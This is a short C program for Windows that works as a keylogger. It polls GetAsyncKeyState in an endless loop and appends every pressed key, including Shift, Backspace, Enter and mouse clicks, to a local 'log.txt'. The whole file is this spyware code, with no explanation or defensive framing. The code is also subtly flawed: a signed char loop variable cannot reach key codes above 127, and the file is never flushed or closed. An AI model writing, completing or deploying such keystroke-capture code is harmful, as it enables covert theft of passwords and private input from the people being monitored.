#include <stdio.h>
#include <windows.h>

int main() {
    char keystroke;

    FILE *file;
    file = fopen("log.txt", "a");

    while (1) {
        Sleep(10);
        for (keystroke = 8; keystroke <= 222; keystroke++) {
            if (GetAsyncKeyState(keystroke) == -32767) {
                if (keystroke == VK_SHIFT)
                    fprintf(file, "%s", "[SHIFT]");
                else if (keystroke == VK_BACK)
                    fprintf(file, "%s", "[BACKSPACE]");
                else if (keystroke == VK_LBUTTON)
                    fprintf(file, "%s", "[LMB]");
                else if (keystroke == VK_RETURN)
                    fprintf(file, "%s", "\n");
                else if (keystroke == VK_SPACE)
                    fprintf(file, "%s", " ");
                else
                    fprintf(file, "%c", keystroke);
            }
        }
    }

    fclose(file);

    return 0;
}
